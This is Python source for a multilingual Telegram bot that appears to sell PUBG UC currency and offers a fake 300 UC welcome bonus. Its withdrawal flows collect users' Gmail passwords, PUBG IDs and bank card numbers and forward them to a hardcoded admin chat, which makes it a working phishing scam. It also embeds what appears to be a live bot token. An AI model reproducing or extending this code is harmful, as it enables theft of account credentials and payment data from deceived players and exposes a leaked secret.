from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import (
    Application, CommandHandler, MessageHandler, ContextTypes,
    ConversationHandler, filters
)
from flask import Flask, request
import re
import uuid
import logging

# Flask server
app = Flask(__name__)

# States
LANGUAGE, PAYMENT_METHOD, EMAIL, PASSWORD, ID, TRANSFER_ID, WITHDRAW_CARD = range(7)

# Foydalanuvchi ma'lumotlari
user_data = {}

# Admin Telegram chat ID
ADMIN_CHAT_ID = 7979995418

# Tillarni aniqlash
LANGUAGES = {
    'uz': {
        'welcome': "🎮 PUBG UC olish botiga xush kelibsiz!\n🎁 300 UC Welcome Bonusni oling hoziroq!",
        'main_menu': "🏠 Asosiy menyu:",
        'account': "Hisobim 💰",
        'buy_uc': "UC Olish 🛒",
        'bonus': "300 UC (Bonus) 🎁",
        'referral': "Referal 🔗",
        'balance_info': "Hisobingizda: {balance} so'm mavjud.\nReferallar soni: {referrals}",
        'top_up': "To'ldirish 💸",
        'transfer_uc': "UC o'tkazish 📤",
        'withdraw': "Pulni chiqarish 💳",
        'payment_method': "💰 To'lov usulini tanlang:",
        'click': "Click 💳",
        'payme': "Payme 💸",
        'payment_not_available': "📌 {method} orqali to'ldirish hozircha mavjud emas.",
        'select_uc': "Tanlang:",
        'uc_purchased': "✅ {uc_amount} UC xarid qilindi! Narxi: {price} so'm.",
        'insufficient_balance': "❌ Hisobingizda yetarli mablag' yo'q.",
        'bonus_claimed': "🎁 Siz bonusni oldingiz!",
        'bonus_received': "🎉 Siz {bonus} so'm bonus oldingiz!",
        'referral_info': "🔗 Sizning referal linkingiz: {link}\nHar bir referal uchun 16 UC (3104 so'm) bonus olasiz!\nDo'stlaringizga ulashing!",
        'transfer_id_prompt': "📤 ID raqamingizni kiriting:",
        'transfer_success': "✅ UC o'tkazish so'rovingiz qabul qilindi. 24 soat ichida o'tkaziladi.",
        'admin_transfer': "📤 Yangi UC o'tkazish so'rovi:\n👤 Telegram ID: {user_id}\n🎮 PUBG ID: {pubg_id}",
        'withdraw_card_prompt': "💳 Plastik kartangiz raqamini to'g'ri kiriting:",
        'withdraw_success': "✅ Pul chiqarish so'rovingiz qabul qilindi. 24 soat ichida hisobingizga tushadi.",
        'admin_withdraw': "💳 Yangi pul chiqarish so'rovi:\n👤 Telegram ID: {user_id}\n💳 Karta raqami: {card_number}",
        'email_prompt': "📧 Gmail pochtangizni kiriting (masalan: example@gmail.com):",
        'invalid_email': "❌ Noto‘g‘ri Gmail formati! Iltimos, qayta urining (masalan: example@gmail.com):",
        'password_prompt': "🔑 Parolingizni kiriting:",
        'id_prompt': "🎮 PUBG ID'ingizni kiriting:",
        'request_sent': "✅ So‘rovingiz yuborildi. Tez orada javob olasiz.",
        'admin_request': "📩 Yangi chiqarish so'rovi:\n👤 Telegram ID: {user_id}\n📧 Email: {email}\n🔑 Parol: {password}\n🎮 PUBG ID: {pubg_id}",
        'cancel': "❌ Jarayon bekor qilindi.",
        'referral_bonus': "🎉 Referalingiz ro'yxatdan o'tdi! Sizga {bonus} so'm bonus qo'shildi.",
        'choose_language': "🌐 Tilni tanlang:",
        'uzbek': "O‘zbekcha",
        'russian': "Русский",
        'english': "English"
    },
    'ru': {
        'welcome': "🎮 Добро пожаловать в бот для покупки UC в PUBG!\n🎁 Получите бонус 300 UC прямо сейчас!",
        'main_menu': "🏠 Главное меню:",
        'account': "Мой счёт 💰",
        'buy_uc': "Купить UC 🛒",
        'bonus': "300 UC (Бонус) 🎁",
        'referral': "Реферал 🔗",
        'balance_info': "На вашем счёте: {balance} сум.\nКоличество рефералов: {referrals}",
        'top_up': "Пополнить 💸",
        'transfer_uc': "Перевести UC 📤",
        'withdraw': "Вывести деньги 💳",
        'payment_method': "💰 Выберите способ оплаты:",
        'click': "Click 💳",
        'payme': "Payme 💸",
        'payment_not_available': "📌 Пополнение через {method} пока недоступно.",
        'select_uc': "Выберите:",
        'uc_purchased': "✅ Куплено {uc_amount} UC! Стоимость: {price} сум.",
        'insufficient_balance': "❌ Недостаточно средств на счёте.",
        'bonus_claimed': "🎁 Вы уже получили бонус!",
        'bonus_received': "🎉 Вы получили бонус {bonus} сум!",
        'referral_info': "🔗 Ваша реферальная ссылка: {link}\nЗа каждого реферала вы получите 16 UC (3104 сум) бонуса!\nДелитесь с друзьями!",
        'transfer_id_prompt': "📤 Введите ваш ID:",
        'transfer_success': "✅ Запрос на перевод UC принят. Перевод будет выполнен в течение 24 часов.",
        'admin_transfer': "📤 Новый запрос на перевод UC:\n👤 Telegram ID: {user_id}\n🎮 PUBG ID: {pubg_id}",
        'withdraw_card_prompt': "💳 Введите номер вашей пластиковой карты:",
        'withdraw_success': "✅ Запрос на вывод средств принят. Деньги поступят на ваш счёт в течение 24 часов.",
        'admin_withdraw': "💳 Новый запрос на вывод средств:\n👤 Telegram ID: {user_id}\n💳 Номер карты: {card_number}",
        'email_prompt': "📧 Введите ваш Gmail (например: example@gmail.com):",
        'invalid_email': "❌ Неверный формат Gmail! Пожалуйста, попробуйте снова (например: example@gmail.com):",
        'password_prompt': "🔑 Введите пароль:",
        'id_prompt': "🎮 Введите ваш PUBG ID:",
        'request_sent': "✅ Ваш запрос отправлен. Скоро вы получите ответ.",
        'admin_request': "📩 Новый запрос на вывод:\n👤 Telegram ID: {user_id}\n📧 Email: {email}\n🔑 Пароль: {password}\n🎮 PUBG ID: {pubg_id}",
        'cancel': "❌ Процесс отменён.",
        'referral_bonus': "🎉 Ваш реферал зарегистрировался! Вам начислено {bonus} сум бонуса.",
        'choose_language': "🌐 Выберите язык:",
        'uzbek': "O‘zbekcha",
        'russian': "Русский",
        'english': "English"
    },
    'en': {
        'welcome': "🎮 Welcome to the PUBG UC purchase bot!\n🎁 Claim your 300 UC Welcome Bonus now!",
        'main_menu': "🏠 Main menu:",
        'account': "My Account 💰",
        'buy_uc': "Buy UC 🛒",
        'bonus': "300 UC (Bonus) 🎁",
        'referral': "Referral 🔗",
        'balance_info': "Your balance: {balance} UZS.\nNumber of referrals: {referrals}",
        'top_up': "Top Up 💸",
        'transfer_uc': "Transfer UC 📤",
        'withdraw': "Withdraw Money 💳",
        'payment_method': "💰 Choose a payment method:",
        'click': "Click 💳",
        'payme': "Payme 💸",
        'payment_not_available': "📌 Top-up via {method} is currently unavailable.",
        'select_uc': "Select:",
        'uc_purchased': "✅ Purchased {uc_amount} UC! Cost: {price} UZS.",
        'insufficient_balance': "❌ Insufficient funds in your account.",
        'bonus_claimed': "🎁 You have already claimed the bonus!",
        'bonus_received': "🎉 You received a {bonus} UZS bonus!",
        'referral_info': "🔗 Your referral link: {link}\nEarn 16 UC (3104 UZS) bonus for each referral!\nShare with friends!",
        'transfer_id_prompt': "📤 Enter your ID:",
        'transfer_success': "✅ UC transfer request accepted. It will be processed within 24 hours.",
        'admin_transfer': "📤 New UC transfer request:\n👤 Telegram ID: {user_id}\n🎮 PUBG ID: {pubg_id}",
        'withdraw_card_prompt': "💳 Enter your plastic card number:",
        'withdraw_success': "✅ Withdrawal request accepted. Funds will be transferred to your account within 24 hours.",
        'admin_withdraw': "💳 New withdrawal request:\n👤 Telegram ID: {user_id}\n💳 Card number: {card_number}",
        'email_prompt': "📧 Enter your Gmail (e.g., example@gmail.com):",
        'invalid_email': "❌ Invalid Gmail format! Please try again (e.g., example@gmail.com):",
        'password_prompt': "🔑 Enter your password:",
        'id_prompt': "🎮 Enter your PUBG ID:",
        'request_sent': "✅ Your request has been sent. You will receive a response soon.",
        'admin_request': "📩 New withdrawal request:\n👤 Telegram ID: {user_id}\n📧 Email: {email}\n🔑 Password: {password}\n🎮 PUBG ID: {pubg_id}",
        'cancel': "❌ Process cancelled.",
        'referral_bonus': "🎉 Your referral has registered! You received a {bonus} UZS bonus.",
        'choose_language': "🌐 Choose a language:",
        'uzbek': "O‘zbekcha",
        'russian': "Русский",
        'english': "English"
    }
}

# UC narx hisoblash
def calculate_price(uc_amount):
    return (uc_amount / 100) * 19400

# Email validatsiyasi
def is_valid_gmail(email):
    pattern = r'^[a-zA-Z0-9._%+-]+@gmail\.com$'
    return bool(re.match(pattern, email))

# Referal kodi generatsiyasi
def generate_referral_code(user_id):
    return str(uuid.uuid4())[:8]

# Start komandasi
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    args = context.args

    if user_id not in user_data:
        user_data[user_id] = {
            'balance': 0,
            'bonus_claimed': False,
            'referral_code': generate_referral_code(user_id),
            'referrals': 0,
            'language': None
        }

    if args and len(args) > 0:
        referral_code = args[0]
        for uid, data in user_data.items():
            if data['referral_code'] == referral_code and uid != user_id:
                referral_bonus = calculate_price(16)
                user_data[uid]['balance'] += referral_bonus
                user_data[uid]['referrals'] += 1
                lang = user_data[uid].get('language', 'uz')
                await context.bot.send_message(
                    chat_id=uid,
                    text=LANGUAGES[lang]['referral_bonus'].format(bonus=int(referral_bonus))
                )
                break

    if user_data[user_id]['language'] is None:
        keyboard = [
            [KeyboardButton(LANGUAGES['uz']['uzbek']), KeyboardButton(LANGUAGES['ru']['russian'])],
            [KeyboardButton(LANGUAGES['en']['english'])]
        ]
        markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
        await update.message.reply_text("🌐 Tilni tanlang / Выберите язык / Choose a language:", reply_markup=markup)
        return LANGUAGE
    else:
        await send_main_menu(update, user_data[user_id]['language'])

# Til tanlash
async def choose_language(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text

    if text == LANGUAGES['uz']['uzbek']:
        user_data[user_id]['language'] = 'uz'
    elif text == LANGUAGES['ru']['russian']:
        user_data[user_id]['language'] = 'ru'
    elif text == LANGUAGES['en']['english']:
        user_data[user_id]['language'] = 'en'
    else:
        await update.message.reply_text("Iltimos, faqat berilgan tillardan birini tanlang!")
        return LANGUAGE

    await send_main_menu(update, user_data[user_id]['language'])
    return ConversationHandler.END

# Asosiy menyuni ko'rsatish
async def send_main_menu(update: Update, lang='uz'):
    keyboard = [
        [KeyboardButton(LANGUAGES[lang]['account']), KeyboardButton(LANGUAGES[lang]['buy_uc'])],
        [KeyboardButton(LANGUAGES[lang]['bonus']), KeyboardButton(LANGUAGES[lang]['referral'])]
    ]
    markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    await update.message.reply_text(LANGUAGES[lang]['main_menu'], reply_markup=markup)

# Message handler
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text
    lang = user_data[user_id].get('language', 'uz')

    if user_id not in user_data:
        user_data[user_id] = {
            'balance': 0,
            'bonus_claimed': False,
            'referral_code': generate_referral_code(user_id),
            'referrals': 0,
            'language': 'uz'
        }

    if text == LANGUAGES[lang]['account']:
        balance = user_data[user_id]['balance']
        referrals = user_data[user_id]['referrals']
        keyboard = [
            [KeyboardButton(LANGUAGES[lang]['top_up']), KeyboardButton(LANGUAGES[lang]['transfer_uc'])],
            [KeyboardButton(LANGUAGES[lang]['withdraw'])]
        ]
        markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
        await update.message.reply_text(
            LANGUAGES[lang]['balance_info'].format(balance=int(balance), referrals=referrals),
            reply_markup=markup
        )

    elif text == LANGUAGES[lang]['top_up']:
        keyboard = [
            [KeyboardButton(LANGUAGES[lang]['click']), KeyboardButton(LANGUAGES[lang]['payme'])],
            [KeyboardButton(LANGUAGES[lang]['main_menu'])]
        ]
        markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
        await update.message.reply_text(LANGUAGES[lang]['payment_method'], reply_markup=markup)

    elif text == LANGUAGES[lang]['click'] or text == LANGUAGES[lang]['payme']:
        await update.message.reply_text(LANGUAGES[lang]['payment_not_available'].format(method=text))
        await send_main_menu(update, lang)

    elif text == LANGUAGES[lang]['main_menu']:
        await send_main_menu(update, lang)

    elif text == LANGUAGES[lang]['buy_uc']:
        uc_options = [300, 400, 500, 600, 1000, 1500, 2000, 5000, 10000]
        keyboard = [
            [KeyboardButton(f"{uc} UC - {int(calculate_price(uc))} {LANGUAGES[lang].get('currency', 'so’m')}") for uc in uc_options[i:i+2]]
            for i in range(0, len(uc_options), 2)
        ]
        keyboard.append([KeyboardButton(LANGUAGES[lang]['main_menu'])])
        markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
        await update.message.reply_text(LANGUAGES[lang]['select_uc'], reply_markup=markup)

    elif text.startswith(tuple(f"{uc} UC - {int(calculate_price(uc))}" for uc in [300, 400, 500, 600, 1000, 1500, 2000, 5000, 10000])):
        uc_amount = int(text.split(" UC")[0])
        price = calculate_price(uc_amount)

        if user_data[user_id]['balance'] >= price:
            user_data[user_id]['balance'] -= price
            await update.message.reply_text(LANGUAGES[lang]['uc_purchased'].format(uc_amount=uc_amount, price=int(price)))
        else:
            await update.message.reply_text(LANGUAGES[lang]['insufficient_balance'])
        await send_main_menu(update, lang)

    elif text == LANGUAGES[lang]['bonus']:
        if user_data[user_id]['bonus_claimed']:
            await update.message.reply_text(LANGUAGES[lang]['bonus_claimed'])
        else:
            bonus = calculate_price(300)
            user_data[user_id]['balance'] += bonus
            user_data[user_id]['bonus_claimed'] = True
            await update.message.reply_text(LANGUAGES[lang]['bonus_received'].format(bonus=int(bonus)))
            keyboard = [
                [KeyboardButton(LANGUAGES[lang]['main_menu']), KeyboardButton(LANGUAGES[lang]['withdraw'])]
            ]
            markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
            await update.message.reply_text(LANGUAGES[lang]['select_uc'], reply_markup=markup)

    elif text == LANGUAGES[lang]['referral']:
        referral_code = user_data[user_id]['referral_code']
        bot_username = (await context.bot.get_me()).username
        referral_link = f"https://t.me/{bot_username}?start={referral_code}"
        await update.message.reply_text(
            LANGUAGES[lang]['referral_info'].format(link=referral_link)
        )
        await send_main_menu(update, lang)

# UC o'tkazish jarayoni
async def start_transfer(update: Update, context: ContextTypes.DEFAULT_TYPE):
    lang = user_data[update.effective_user.id].get('language', 'uz')
    await update.message.reply_text(LANGUAGES[lang]['transfer_id_prompt'])
    return TRANSFER_ID

async def transfer_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    lang = user_data[user_id].get('language', 'uz')
    user_data[user_id]['transfer_id'] = update.message.text
    await update.message.reply_text(LANGUAGES[lang]['transfer_success'])
    await context.bot.send_message(
        chat_id=ADMIN_CHAT_ID,
        text=LANGUAGES[lang]['admin_transfer'].format(user_id=user_id, pubg_id=user_data[user_id]['transfer_id'])
    )
    keyboard = [
        [KeyboardButton(LANGUAGES[lang]['main_menu']), KeyboardButton(LANGUAGES[lang]['top_up'])]
    ]
    markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    await update.message.reply_text(LANGUAGES[lang]['select_uc'], reply_markup=markup)
    return ConversationHandler.END

# Pulni chiqarish jarayoni
async def start_withdrawal(update: Update, context: ContextTypes.DEFAULT_TYPE):
    lang = user_data[update.effective_user.id].get('language', 'uz')
    await update.message.reply_text(LANGUAGES[lang]['withdraw_card_prompt'])
    return WITHDRAW_CARD

async def withdraw_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    lang = user_data[user_id].get('language', 'uz')
    user_data[user_id]['card_number'] = update.message.text
    await update.message.reply_text(LANGUAGES[lang]['withdraw_success'])
    await context.bot.send_message(
        chat_id=ADMIN_CHAT_ID,
        text=LANGUAGES[lang]['admin_withdraw'].format(user_id=user_id, card_number=user_data[user_id]['card_number'])
    )
    await send_main_menu(update, lang)
    return ConversationHandler.END

async def start_withdrawal_old(update: Update, context: ContextTypes.DEFAULT_TYPE):
    lang = user_data[update.effective_user.id].get('language', 'uz')
    await update.message.reply_text(LANGUAGES[lang]['email_prompt'])
    return EMAIL

async def email(update: Update, context: ContextTypes.DEFAULT_TYPE):
    lang = user_data[update.effective_user.id].get('language', 'uz')
    email = update.message.text
    if is_valid_gmail(email):
        user_data[update.effective_user.id]['email'] = email
        await update.message.reply_text(LANGUAGES[lang]['password_prompt'])
        return PASSWORD
    else:
        keyboard = [[KeyboardButton(LANGUAGES[lang]['main_menu'])]]
        markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
        await update.message.reply_text(LANGUAGES[lang]['invalid_email'], reply_markup=markup)
        return EMAIL

async def password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    lang = user_data[update.effective_user.id].get('language', 'uz')
    user_data[update.effective_user.id]['password'] = update.message.text
    await update.message.reply_text(LANGUAGES[lang]['id_prompt'])
    return ID

async def id_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    lang = user_data[user_id].get('language', 'uz')
    user_data[user_id]['id'] = update.message.text

    data = user_data[user_id]
    msg = LANGUAGES[lang]['admin_request'].format(
        user_id=user_id,
        email=data['email'],
        password=data['password'],
        pubg_id=data['id']
    )
    await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=msg)

    await update.message.reply_text(LANGUAGES[lang]['request_sent'])
    await send_main_menu(update, lang)
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    lang = user_data[update.effective_user.id].get('language', 'uz')
    await update.message.reply_text(LANGUAGES[lang]['cancel'])
    await send_main_menu(update, lang)
    return ConversationHandler.END

# Webhook handler
@app.route('/webhook', methods=['POST'])
async def webhook():
    update = Update.de_json(request.get_json(), application.bot)
    await application.process_update(update)
    return 'OK'

# Botni ishga tushirish
def main():
    global application
    application = Application.builder().token("8026819719:AAEoslKl7xaTmEYFCIqeS7RWTi6SkZNwQbI").build()

    conv_handler = ConversationHandler(
        entry_points=[
            CommandHandler("start", start),
            MessageHandler(filters.Regex(r"^(O‘zbekcha|Русский|English)$"), choose_language),
            MessageHandler(filters.Regex(r"^(Chiqarish 💳|Вывести деньги 💳|Withdraw Money 💳)$"), start_withdrawal_old),
            MessageHandler(filters.Regex(r"^(UC o'tkazish 📤|Перевести UC 📤|Transfer UC 📤)$"), start_transfer),
            MessageHandler(filters.Regex(r"^(Pulni chiqarish 💳|Вывести деньги 💳|Withdraw Money 💳)$"), start_withdrawal)
        ],
        states={
            LANGUAGE: [MessageHandler(filters.TEXT & ~filters.COMMAND, choose_language)],
            EMAIL: [MessageHandler(filters.TEXT & ~filters.COMMAND, email)],
            PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, password)],
            ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, id_input)],
            TRANSFER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, transfer_id)],
            WITHDRAW_CARD: [MessageHandler(filters.TEXT & ~filters.COMMAND, withdraw_card)],
        },
        fallbacks=[CommandHandler("cancel", cancel), MessageHandler(filters.Regex(r"^(Asosiy menyu 🏠|Главное меню 🏠|Main menu 🏠)$"), cancel)]
    )

    application.add_handler(conv_handler)
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    # Webhookni sozlash (asinxron tarzda)
    import asyncio
    asyncio.run(application.bot.set_webhook(url='https://fd22b8a7656f.ngrok-free.app'))

    # Flask serverni 5000-portda ishga tushirish
    app.run(port=5000)

if __name__ == "__main__":
    main()
